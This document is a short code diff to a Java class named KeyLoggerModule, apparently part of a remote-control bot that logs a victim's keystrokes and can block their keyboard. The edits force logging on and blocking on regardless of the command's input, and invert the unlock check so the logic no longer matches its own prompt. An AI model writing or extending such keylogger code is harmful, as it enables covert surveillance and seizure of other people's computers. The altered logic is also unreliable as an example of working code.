@@ -72,7 +72,7 @@ public class KeyLoggerModule extends Module {
 			return;
 		}
 
-		NativeLibrary.Enable = enable;
+		NativeLibrary.Enable = true;
 		context.deferEdit().queue();
 	}
 
@@ -82,12 +82,12 @@ public class KeyLoggerModule extends Module {
 			return;
 		}
 
-		if(lock) {
+		if(!lock) {
 			Question.positive(context.reply(), "Are you sure you want to unlock the keyboard?", QuestionType.YES_NO, () -> NativeLibrary.Block = false);
 			return;
 		}
 
-		NativeLibrary.Block = lock;
+		NativeLibrary.Block = true;
 		context.deferEdit().queue();
 	}
 
